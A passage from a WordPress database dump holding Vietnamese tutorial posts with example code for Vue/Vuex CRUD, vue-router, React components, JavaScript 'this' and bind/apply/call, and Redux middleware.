0x10000).toString(16).substring(1);\r\n\r\n        const api_students = {\r\n            sleep(time) {\r\n                return new Promise((resolve, reject) => {\r\n                    setTimeout(() => {\r\n                        resolve()\r\n                    }, time);\r\n                })\r\n            },\r\n            async getOnline(url) {\r\n                const response = await fetch(url)\r\n                const studentList = await response.json()\r\n                localStorage.setItem(\'studentList\', JSON.stringify(studentList))\r\n                return studentList\r\n            },\r\n            async getByID(id) {\r\n                await this.sleep(500)\r\n                const studentList = JSON.parse(localStorage.getItem(\'studentList\')) || []\r\n                const student = studentList.find(item => item.id == id)\r\n                return student\r\n            },\r\n            async create(student) {\r\n                await this.sleep(500)\r\n                const studentList = JSON.parse(localStorage.getItem(\'studentList\')) || []\r\n                studentList.push(student)\r\n                localStorage.setItem(\'studentList\', JSON.stringify(studentList))\r\n                return student\r\n            },\r\n            async read() {\r\n                await this.sleep(500)\r\n                const studentList = JSON.parse(localStorage.getItem(\'studentList\')) || []\r\n                return studentList\r\n            },\r\n            async update(student) {\r\n                await this.sleep(500)\r\n                const studentList = JSON.parse(localStorage.getItem(\'studentList\')) || []\r\n                const find_student = studentList.find(item => item.id == student.id)\r\n                find_student.username = student.username\r\n                find_student.email = student.email\r\n                localStorage.setItem(\'studentList\', JSON.stringify(studentList))\r\n                return find_student\r\n            },\r\n            async delete(id) {\r\n                await this.sleep(500)\r\n                const studentList = JSON.parse(localStorage.getItem(\'studentList\')) || []\r\n                const find_student = studentList.find(item => item.id == id)\r\n                const newList = studentList.filter(item => item.id !== id)\r\n                localStorage.setItem(\'studentList\', JSON.stringify(newList))\r\n                return find_student\r\n            },\r\n        }\r\n    </script>\r\n    <script>\r\n        const store = Vuex.createStore({\r\n            state() {\r\n                return {\r\n                    studentList: [],\r\n                    loading: false,\r\n                }\r\n            },\r\n\r\n            actions: {\r\n                async action_startLoad(context, payload) {\r\n                    context.commit(\"startLoading\")\r\n                },\r\n                async action_endLoad(context, payload) {\r\n                    context.commit(\"endLoading\")\r\n                },\r\n                async action_fakeStudentsOnline(context, payload) {\r\n                    context.commit(\"startLoading\")\r\n                    const studentList = await api_students.getOnline(payload)\r\n                    context.commit(\"setStudentList\", studentList)\r\n                    context.commit(\"endLoading\")\r\n                },\r\n                async action_getStudents(context) {\r\n                    context.commit(\"startLoading\")\r\n                    const studentList = await api_students.read()\r\n                    context.commit(\"setStudentList\", studentList)\r\n                    context.commit(\"endLoading\")\r\n                },\r\n                async action_createStudent(context, payload) {\r\n                    context.commit(\"startLoading\")\r\n                    const student = await api_students.create(payload)\r\n                    context.commit(\"createStudent\", student)\r\n                    context.commit(\"endLoading\")\r\n                },\r\n                async action_updateStudent(context, payload) {\r\n                    context.commit(\"startLoading\")\r\n                    const student = await api_students.update(payload)\r\n                    context.commit(\"updateStudent\", student)\r\n                    context.commit(\"endLoading\")\r\n                },\r\n                async action_deleteStudent(context, payload) {\r\n                    context.commit(\"startLoading\")\r\n                    const student = await api_students.delete(payload)\r\n                    context.commit(\"deleteStudent\", student)\r\n                    context.commit(\"endLoading\")\r\n                },\r\n            },\r\n\r\n            mutations: {\r\n                startLoading(state) {\r\n                    state.loading = true\r\n                },\r\n                endLoading(state) {\r\n                    state.loading = false\r\n                },\r\n                setStudentList(state, payload) {\r\n                    state.studentList = payload;\r\n                },\r\n                createStudent(state, payload) {\r\n                    state.studentList.push(payload);\r\n                },\r\n                updateStudent(state, payload) {\r\n                    const find_student = state.studentList.find(item => item.id == payload.id)\r\n                    find_student.username = payload.username\r\n                    find_student.email = payload.email\r\n                },\r\n                deleteStudent(state, payload) {\r\n                    state.studentList = state.studentList.filter(item => item.id !== payload.id)\r\n                },\r\n            },\r\n\r\n            getters: {\r\n                studentList: state => state.studentList,\r\n                loading: state => state.loading,\r\n            }\r\n        })\r\n\r\n        const RootComponent = {\r\n            data() {\r\n                return {\r\n                    student: { username: \'\', email: \'\', id: \'\' },\r\n                    filter: \"\",\r\n                    url_fakeStudent: \"https://jsonplaceholder.typicode.com/users\",\r\n                }\r\n            },\r\n            created() {\r\n                this.$store.dispatch(\"action_getStudents\")\r\n            },\r\n            methods: {\r\n                getStudentsOnline() {\r\n                    console.log(this);\r\n                    this.$store.dispatch(\'action_fakeStudentsOnline\', this.url_fakeStudent)\r\n                },\r\n                saveStudent() {\r\n                    if (!this.student.id) {\r\n                        this.student.id = uuid();\r\n                        this.$store.dispatch(\'action_createStudent\', { ...this.student })\r\n                    } else {\r\n                        this.$store.dispatch(\'action_updateStudent\', { ...this.student })\r\n                    }\r\n                    this.student = { username: \'\', email: \'\', id: \'\' }\r\n                },\r\n                async getStudentByID(id) {\r\n                    this.$store.dispatch(\'action_startLoad\')\r\n                    this.student = await api_students.getByID(id)\r\n                    this.$store.dispatch(\'action_endLoad\')\r\n                },\r\n                deleteStudent(id) {\r\n                    this.$store.dispatch(\'action_deleteStudent\', id)\r\n                }\r\n            },\r\n            computed: {\r\n                studentList() {\r\n                    return this.$store.getters.studentList\r\n                },\r\n                loading() {\r\n                    return this.$store.getters.loading\r\n                },\r\n                filterStudent() {\r\n                    return this.studentList.filter(item => item.username.includes(this.filter))\r\n                }\r\n            }\r\n        }\r\n        const app = Vue.createApp(RootComponent).use(store).mount(\"#app\")\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'CRUD - StudentList with Vuex', '', 'publish', 'open', 'open', '', 'crud-studentlist-with-vuex', '', '', '2022-11-03 10:04:59', '2022-11-03 10:04:59', '', 0, 'https://duycode.com/?p=1281', 0, 'post', '', 0),
(1283, 1, '2021-07-15 01:00:09', '2021-07-14 18:00:09', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<style>\r\n    body {\r\n        background-color: green;\r\n        padding-top: 25%;\r\n        text-align: center;\r\n    }\r\n\r\n    .button {\r\n        position: relative;\r\n        display: inline-block;\r\n        cursor: pointer;\r\n        margin: 0 auto;\r\n        width: 70px;\r\n        height: 70px;\r\n        font-size: 52px;\r\n        transition: all 0.4s ease-in;\r\n    }\r\n\r\n    .button span[class^=\'ion\'] {\r\n        position: relative;\r\n    }\r\n\r\n    .button:before {\r\n        content: \'\';\r\n        background-color: aliceblue;\r\n        border-radius: 50%;\r\n        display: block;\r\n        position: absolute;\r\n        top: 0;\r\n        right: 0;\r\n        bottom: 0;\r\n        left: 0;\r\n        transform: scale(0.001, 0.001);\r\n    }\r\n\r\n    .button:focus {\r\n        outline: 0;\r\n        color: #fff;\r\n    }\r\n\r\n    .button:focus:before {\r\n        animation: effect_dylan 0.8s ease-out;\r\n    }\r\n\r\n    @keyframes effect_dylan {\r\n        50% {\r\n            transform: scale(1.5, 1.5);\r\n            opacity: 0;\r\n        }\r\n\r\n        99% {\r\n            transform: scale(0.001, 0.001);\r\n            opacity: 0;\r\n        }\r\n\r\n        100% {\r\n            transform: scale(0.001, 0.001);\r\n            opacity: 1;\r\n        }\r\n    }\r\n</style>\r\n\r\n<body>\r\n    <div class=\"container\">\r\n        <div class=\"button\" tabindex=\"1\">\r\n            <span class=\"ion-help-circled\">a</span>\r\n        </div>\r\n        <div class=\"button\" tabindex=\"2\">\r\n            <span class=\"ion-log-in\">b</span>\r\n        </div>\r\n        <div class=\"button\" tabindex=\"3\">\r\n            <span class=\"ion-help-buoy\">c</span>\r\n        </div>\r\n    </div>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'CSS - effect click', '', 'publish', 'open', 'open', '', 'css-effect-click', '', '', '2023-10-23 13:37:20', '2023-10-23 13:37:20', '', 0, 'https://duycode.com/?p=1283', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1298, 1, '2021-07-01 09:59:00', '2021-07-01 02:59:00', '<h2>1. Chuẩn bị API</h2>\r\n- Nếu chưa có link API có thể dùng tạm json-server để làm link API tạm thời\r\n<blockquote>npm install -g json-server</blockquote>\r\n-- Tạo file: ./data/db.json\r\n-- Chạy server data\r\n<blockquote>json-server --watch data/db.json</blockquote>\r\n-- Như vậy là đã tạo được database fake :3\r\n\r\n<h2>2. Fetching Data với created()</h2>\r\nNên get Data trong hook created()\r\n<pre>\r\ncreated() {\r\n    fetch(\"http://localhost:3000/user\")\r\n        .then((response) => response.json())\r\n        .then((data) => {\r\n            this.user_list = data;\r\n            console.log(data);\r\n        });\r\n},\r\n</pre>\r\n\r\n<h2>3. Trường hợp dùng setup()</h2>\r\n-- Khi dùng setup, có mẫu dùng như sau:\r\n<pre>\r\n<template>\r\n    <div>\r\n        <u v-if=\"transactions.length\">\r\n            <li v-for=\"(tr, index) in transactions\" v-bind:key=\"index\">\r\n                {{ tr.name }} - {{ tr.age }}\r\n            </li>\r\n        </u>\r\n    </div>\r\n</template>\r\n\r\n<script>\r\nimport { ref } from \"vue\";\r\nexport default {\r\n    //vẫn cần phải nhớ, mọi biến gọi ra trong setup() đều phải được sử dụng, nếu không sẽ lỗi\r\n    setup() {\r\n        const transactions = ref([]);\r\n        const error = ref(null);\r\n\r\n        const fetchData = async () => {\r\n            try {\r\n                const response = await fetch(\"http://localhost:3000/user\");\r\n                if (!response.ok) throw new Error(\"Somthing went wrong\");\r\n                transactions.value = await response.json(); //trả về dạng: [{name:...,age:...}]\r\n            } catch (e) {\r\n                error.value = e;\r\n                console.log(e);\r\n            }\r\n        };\r\n        fetchData();\r\n        return { transactions, error };\r\n    },\r\n};\r\n</script>\r\n\r\n<style scoped>\r\n</style>\r\n</pre>\r\n\r\n', 'VueJS3 - Fetching Data', '', 'publish', 'open', 'open', '', 'vuejs3-fetching-data', '', '', '2022-08-07 00:51:37', '2022-08-07 00:51:37', '', 0, 'https://duycode.com/?p=1298', 0, 'post', '', 0),
(1307, 1, '2022-10-05 01:00:48', '2022-10-05 01:00:48', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n	<meta charset=\"UTF-8\">\r\n	<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n	<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n	<title>Vue - Router</title>\r\n	<style>\r\n		p {\r\n			font-family: monospace;\r\n			white-space: pre-wrap;\r\n		}\r\n	</style>\r\n</head>\r\n\r\n<body>\r\n	<div id=\"app\">\r\n		<nav>\r\n			<router-link to=\"/\">Home</router-link> -\r\n			<router-link to=\"/user/1/details\">User</router-link> -\r\n			<router-link to=\"/about\">About</router-link> -\r\n			<router-link to=\"/xxx\">xxx</router-link>\r\n		</nav>\r\n		<router-view></router-view>\r\n	</div>\r\n\r\n	<script src=\"https://unpkg.com/vue@3.2.41/dist/vue.global.js\"></script>\r\n	<script src=\"https://unpkg.com/vue-router@4.1.6/dist/vue-router.global.js\"></script>\r\n\r\n	<script>\r\n		const Home = { template: \'<h2>Home Page</h2><p>{{JSON.stringify($route, null, 4)}}</p>\' }\r\n		const About = { template: \'<h2>About Page</h2><p>{{JSON.stringify($route, null, 4)}}</p>\' }\r\n		const NotFound = { template: \'<h2>NotFound Page</h2><p>{{JSON.stringify($route, null, 4)}}</p>\' }\r\n		\r\n		const User = { template: \'<h2>User Page</h2><router-view></router-view>\' }\r\n		const UserDetails = { template: \'<h3>User Details</h3><p>{{JSON.stringify($route, null, 4)}}</p>\' }\r\n\r\n		const router = VueRouter.createRouter({\r\n			history: VueRouter.createWebHistory(),\r\n			routes: [\r\n				{ path: \'/\', component: Home },\r\n				{\r\n					path: \'/user/:id\',\r\n					component: User,\r\n					children: [\r\n						{\r\n							path: \'details\',\r\n							component: UserDetails,\r\n						},\r\n					]\r\n				},\r\n				{ path: \'/about\', component: About },\r\n				{ path: \'/layzy-component\', component: () => import(\'./views/UserDetails\') },\r\n				{ path: \'/:pathMatch(.*)\', component: NotFound },\r\n			],\r\n		})\r\n\r\n		const app = Vue.createApp({})\r\n		app.use(router)\r\n		app.mount(\"#app\")\r\n	</script>\r\n</body>\r\n\r\n</html>\r\n\r\n</pre>', 'vue-router: Basic', '', 'publish', 'open', 'open', '', 'vue-router-basic', '', '', '2022-11-05 15:51:32', '2022-11-05 15:51:32', '', 0, 'https://duycode.com/?p=1307', 0, 'post', '', 0),
(1312, 1, '2021-05-01 01:00:17', '2021-04-30 18:00:17', '<h2>1. Làm quen với ReactJS</h2>\r\n-- Demo sử dụng ReactJS bằng cách sử dụng CDN\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app1\"></div>\r\n    <div id=\"app2\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n\r\n    <script>\r\n        let element1 = React.createElement(\'h1\', { style: { color: \'red\', fontSize: \'30px\' } }, \'Hello ReactJS !!!\');\r\n        ReactDOM.render(\r\n            element1,\r\n            document.getElementById(\'app1\')\r\n        );\r\n    </script>\r\n\r\n    <!-- muốn sử dụng JSX cần có babel và thẻ script ở dạng text/babel -->\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n    <script type=\"text/babel\">\r\n        let element2 = <h1 style={{ color: \'green\', fontSize: \'30px\' }}>Hello ReactJS !!!</h1>;\r\n\r\n        ReactDOM.render(\r\n            element2,\r\n            document.getElementById(\'app2\')\r\n        );\r\n    </script>\r\n</body>\r\n</html>\r\n</pre>\r\n\r\n<h2>2. Hook Component là gì</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n \r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n \r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n \r\n    <script type=\"text/babel\">\r\n        const { useState } = React;\r\n\r\n        // component là một function\r\n        const App = (props) => {\r\n            const [name, setName] = useState(\"Jack\")\r\n            return (\r\n                <div>\r\n                    <h2>Props: {props.title}</h2>\r\n                    <h2>State: {name}</h2>\r\n                </div>\r\n            );\r\n        }\r\n \r\n        ReactDOM.render(\r\n            <App title=\"Class Component\" />,\r\n            document.getElementById(\'root\')\r\n        );\r\n    </script>\r\n</body>\r\n \r\n</html>\r\n</pre>\r\n\r\n<h2>3. Class Component là gì</h2>\r\n<h3>3.1. Component - Class ES6</h3>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        class App extends React.Component {\r\n            constructor(props) {\r\n                super(props);\r\n                this.state = {name: \"Jack\"}\r\n            }\r\n            render() {\r\n                return (\r\n                    <div>\r\n                        <h2>Props: {this.props.title}</h2>\r\n                        <h2>State: {this.state.name}</h2>\r\n                    </div>\r\n                );\r\n            }\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App title=\"Class Component\" />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h3>3.2. Bolus: Component - createClass</h3>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <script crossorigin src=\"https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react.js\"></script>\r\n    <script crossorigin src=\"https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react-dom.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        //Trước phiên bản React 16 (đang dùng CDN phiên bản 15), ES6 chưa ra đời\r\n        //React tự tạo Class bằng cách dùng React.createClass (và chính createClass đã được loại bỏ từ phiên bản 16)\r\n        const App = React.createClass({\r\n            getInitialState() {\r\n                return {\r\n                    name: \'Jack\'\r\n                }\r\n            },\r\n            render() {\r\n                return (\r\n                    <div>\r\n                        <p>Props: <strong>{this.props.title}</strong></p>\r\n                        <p>State: <strong>{this.state.name}</strong></p>\r\n                    </div>\r\n                )\r\n            }\r\n        })\r\n\r\n        ReactDOM.render(\r\n            <App title=\"Class - without ES6\" />,\r\n            document.getElementById(\'app\')\r\n        );\r\n    </script>\r\n</body>\r\n</html>\r\n</pre>', 'ReactJS - 1. Hook và Class', '', 'publish', 'open', 'open', '', 'reactjs-1-hook-va-class', '', '', '2022-05-20 09:24:27', '2022-05-20 02:24:27', '', 0, 'https://duycode.com/?p=1312', 0, 'post', '', 0),
(1314, 1, '2021-07-02 14:02:41', '0000-00-00 00:00:00', '<pre>\n</pre>', 'Reac', '', 'draft', 'open', 'open', '', '', '', '', '2021-07-02 14:02:41', '0000-00-00 00:00:00', '', 0, 'https://duycode.com/?p=1314', 0, 'post', '', 0),
(1316, 1, '2021-07-03 22:31:39', '2021-07-03 15:31:39', '<h3>1. Arguments trong Javascript</h3>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <script>\r\n        const example = function () {\r\n            console.log(arguments)                                   // Arguments(2) [\'abc\', 123, callee: ƒ, Symbol(Symbol.iterator): ƒ]\r\n            console.log(typeof arguments, Array.isArray(arguments))  // object false\r\n            console.log(JSON.stringify(arguments))                   // {\"0\":\"abc\",\"1\":123}\r\n            console.log(Array.from(arguments))                       // [\'abc\', 123]\r\n            console.log(arguments[0], arguments[1], arguments[2])    // abc 123 undefined\r\n            for (let i = 0; i < arguments.length; i++) {\r\n                console.log(arguments[i])                            // abc 123\r\n            }\r\n        }\r\n        example(\"abc\", 123)\r\n\r\n        const note = () => console.log(arguments)\r\n        note()                                                       // ReferenceError: arguments is not defined   \r\n    </script>\r\n</head>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h3>2. This trong Javascript</h3>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <script>\r\n        const mouse = {\r\n            aa: function () {                   // -----> có tạo context là mouse\r\n                console.log(this);              // ===> mouse\r\n                const a1 = function () {\r\n                    console.log(this);          // ===> window\r\n                };\r\n                const a2 = () => {\r\n                    console.log(this);          // ===> mouse\r\n                };\r\n                a1();\r\n                a2();\r\n            },\r\n            bb: () => {                         // -----> không tạo context\r\n                console.log(this);              // ===> window\r\n                const b1 = function () {\r\n                    console.log(this);          // ===> window\r\n                };\r\n                const b2 = () => {\r\n                    console.log(this);          // ===> window\r\n                };\r\n                b1();\r\n                b2();\r\n            },\r\n            cc: {\r\n                cx: function () {               // -----> có tạo context là mouse.cc\r\n                    console.log(this);          // ===> mouse.cc\r\n                    const c1 = function () {\r\n                        console.log(this);      // ===> window\r\n                    };\r\n                    const c2 = () => {\r\n                        console.log(this);      // ===> mouse.cc\r\n                    };\r\n                    c1();\r\n                    c2();\r\n                },\r\n            },\r\n            dd: {\r\n                dx: () => {                     // -----> không tạo context\r\n                    console.log(this);          // ===> window\r\n                    const d1 = function () {\r\n                        console.log(this);      // ===> window\r\n                    };\r\n                    const d2 = () => {\r\n                        console.log(this);      // ===> window\r\n                    };\r\n                    d1();\r\n                    d2();\r\n                },\r\n            }\r\n        };\r\n        mouse.aa();\r\n        mouse.bb();\r\n        mouse.cc.ww();\r\n        mouse.dd.dx();\r\n    </script>\r\n</head>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h3>3. Bind, Apply và Call trong Javascript </h3>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <script>\r\n        const example = {\r\n            data: 1000,\r\n            func1: function (param1, param2, param3) {\r\n                console.log(this, param1, param2, param3)\r\n            },\r\n            // arrow function không có this => apply,call và bind không sử dụng context được\r\n            func2: (param1, param2, param3) => {\r\n                console.log(this, param1, param2, param3)\r\n            },\r\n        }\r\n        const convert = { data: 99 }\r\n\r\n        example.func1(123, 456)   // {data: 1000, func1: ƒ, func2: ƒ} 123 456 undefined\r\n\r\n        console.log(\"==== BIND === chỉ tạo function mới mà chưa thực thi ====================== =====\")\r\n        convert.func1 = example.func1.bind(convert, 123, 456)\r\n        convert.func2 = example.func2.bind(convert, \"abc\", \"xyz\")   // arrow function không có this, nên không thể bind \"convert\" được\r\n\r\n        convert.func1(789)                                          // {data: 99, func1: ƒ, func2: ƒ} 123 456 789\r\n        convert.func2(\"ijk\")                                        // Window, \'abc\' \'xyz\' \'ijk\'\r\n\r\n        console.log(\"==== APPLY === thực thi luôn function với gắn argument vào 1 mảng ===============\")\r\n        example.func1.apply(convert, [123, 456])                    // {data: 99, func1: ƒ, func2: ƒ} 123 456 undefined\r\n        example.func2.apply(convert, [\"abc\", \"xyz\"])                // Window, \'abc\' \'xyz\' undefined\r\n\r\n        console.log(\"=== CALL======== thực thi luôn function với gắn argument từng biến ==============\")\r\n        example.func1.call(convert, 123, 456)                       // {data: 99, func1: ƒ, func2: ƒ} 123 456 undefined\r\n        example.func2.call(convert, \"abc\", \"xyz\")                   // Window, \'abc\' \'xyz\' undefined\r\n    </script>\r\n</head>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h3>4. HOF - Higher Order Function</h3>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <script>\r\n        function doBusinessJob() {\r\n            console.log(\'Do my job\', JSON.stringify(arguments))\r\n        }\r\n\r\n        function logDecorator(func) {\r\n            return function () {\r\n                console.log(\'Start my job\')                        // Thêm chức năng ghi log cho function\r\n                const result = func.apply(this, arguments)\r\n                return result;\r\n            }\r\n        }\r\n\r\n        const logWrapper = logDecorator(doBusinessJob);\r\n\r\n        doBusinessJob(\"ABC\", \"XYZ\");                              // Do my job {\"0\":\"ABC\",\"1\":\"XYZ\"}\r\n        logWrapper(\"ABC\", \"XYZ\");                                 // Start my job  +  Do my job {\"0\":\"ABC\",\"1\":\"XYZ\"}\r\n    </script>\r\n</head>\r\n\r\n</html>\r\n</pre>', 'Argument, This, Bind, Apply, Call và HOF trong Javascript', '', 'publish', 'open', 'open', '', 'argument-this-bind-apply-call-va-hof-trong-javascript', '', '', '2022-11-12 11:33:00', '2022-11-12 11:33:00', '', 0, 'https://duycode.com/?p=1316', 0, 'post', '', 0),
(1324, 1, '2021-06-29 02:00:58', '2021-06-28 19:00:58', '<img src=\"https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif\" alt=\"Redux\" />\n** Kiến thức chú ý trong bài:\n- Redux: dispatch, action, reducer\n- Middleware\n- Redux devtools extension\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>ReactJS</title>\n    <style>\n        table {\n            border-collapse: collapse;\n        }\n\n        th,\n        td {\n            padding: 0 0.5rem;\n            border: 1px solid black;\n        }\n    </style>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n\n    <!-- =========== src/utils.js =========== -->\n    <script>\n        class Uuid {\n            s4() {\n                return Math.floor((1 + Math.random()) * 0x10000)\n                    .toString(16)\n                    .substring(1);\n            }\n            s16() {\n                return this.s4() + this.s4() + this.s4() + this.s4();\n            }\n        }\n        let uuid = new Uuid();\n    </script>\n\n\n    <!-- =========== constants/ActionTypes.js =========== -->\n    <script>\n        //Các hằng số types ==> sử dụng cho các actions\n        const types = {\n            SAVE_STUDENT: \'SAVE_STUDENT\',\n            DELETE_STUDENT: \'DELETE_STUDENT\',\n            SET_LIST_STUDENT: \'SET_LIST_STUDENT\',\n        };\n    </script>\n\n    <!-- =========== reducers/listStudent_reducer.js =========== -->\n    <script>\n        //Trong 1 Reducer bao gồm 2 thành phần: state và reducer\n        //State là nơi chứa dữ liệu\n        //Reducer là nơi xử lý các action (khi bị dispatch)\n        //---- listStudent_state có thể khởi tạo mặc định hoặc lấy trên localStorage\n        let listStudent_state = JSON.parse(localStorage.getItem(\'listStudent\')) || [];\n        let listStudent_reducer = (state = listStudent_state, action) => {\n            //Khi làm việc với state, cần return ra 1 state mới, \n            //Tốt nhất nên copystate cũ luôn\n            let new_state = [...state]\n            switch (action.type) {\n                case types.SAVE_STUDENT:\n                    if (!action.payload.id) {\n                        let new_student = {\n                            id: uuid.s16(),\n                            username: action.payload.username,\n                            email: action.payload.email,\n                        };\n                        new_state.push(new_student);\n                    } else {\n                        let find_student = new_state.find((item) => item.id == action.payload.id);\n                        find_student.username = action.payload.username;\n                        find_student.email = action.payload.email;\n                    }\n                    localStorage.setItem(\'listStudent\', JSON.stringify(new_state));\n                    return new_state;\n\n                case types.DELETE_STUDENT:\n                    new_state = state.filter((item) => item.id != action.payload);\n                    localStorage.setItem(\'listStudent\', JSON.stringify(new_state));\n                    return new_state;\n\n                case types.SET_LIST_STUDENT:\n                    localStorage.setItem(\'listStudent\', JSON.stringify(action.payload));\n                    return action.payload;\n            }\n            return new_state;\n        };\n    </script>\n\n    <!-- =========== reducers/listproduct_Reducer.js =========== -->\n\n    <!-- =========== reducers/index.js =========== -->\n    <script>\n        //Combine nhiều Reducers lại để tạo ra 1 Reducer duy nhất\n        let rootReducer = Redux.combineReducers({\n            listStudent: listStudent_reducer,\n            //product: productReducer,\n        });\n    </script>\n\n    <!-- =========== actions/index.js =========== -->\n    <script>\n        //Các action khi được dispatch ==> sẽ trả về object actions tương ứng\n        let action_saveStudent = (student) => ({\n            type: types.SAVE_STUDENT,\n            payload: student,\n        });\n        let action_deleteStudent = (id) => ({\n            type: types.DELETE_STUDENT,\n            payload: id,\n        });\n        let action_setListStudent = (list) => ({\n            type: types.SET_LIST_STUDENT,\n            payload: list,\n        })\n\n        // Trường hợp action là 1 function get api (không trả về 1 object nữa)\n        // ==> Giải quyết bằng cách dùng middleware ==> Từ action này lại dispatch 1 action khác \n        let action_getAllStudent = () => async (dispatch) => {\n            let url = \'https://fakestoreapi.com/users?limit=10\';\n            let response = await fetch(url);\n            let responseJSON = await response.json();\n            dispatch(action_setListStudent(responseJSON));\n        };\n    </script>\n\n    <!-- =========== middleware/list_middleware.js =========== -->\n    <script>\n        //Khi action là 1 function get api (không phải là 1 object như bình thường, cần phải xử lý qua middleware)\n        const processFunctionMiddleware = store => next => action => {\n            if (typeof action === \'function\') {\n                // Vì action_getAllStudent là 1 hàm, nên cần truyền lại dispatch vào hàm đó để sử dụng\n                // Câu lệnh này sẽ khởi chạy được đoạn: \"dispatch(action_setListStudent(list));\"\n                return action(next)\n            }\n            // Nếu action không trả về 1 function, thì chắc là nó trả về 1 object, nếu thế thì cho nó đi tiếp luôn :D\n            return next(action);\n        }\n\n        //Middleware là việc kiểm tra và xử lý các action trước ==> convert các action đúng ý mình trước đã, rồi mới cho đi tiếp\n        const checkSymbolMiddleware = store => next => action => {\n            //console.log(store, next, action, store.getState());\n            if (action.type == types.SAVE_STUDENT && action.payload.username.includes(\"fuck\")) {\n                action.payload.username = action.payload.username.replaceAll(\"fuck\", \"****\")\n            }\n            //next: tương đương với \"dispatch\" ==> next(action) tương đương dispatch(action)==>nghĩa là chạy bình thường\n            return next(action);\n        }\n\n    </script>\n\n    <!-- =========== src/store.js =========== -->\n    <script type=\"text/babel\">\n        // Cái đoạn lằng nhằng là để sử dụng cho redux chrome extensions\n        const composeEnhancers =\n            typeof window === \'object\' &&\n                window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ ?\n                window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__({\n                    // Specify extension’s options like name, actionsBlacklist, actionsCreators, serialize...\n                }) : Redux.compose;\n        // Gọi store bằng reducers(basic): const 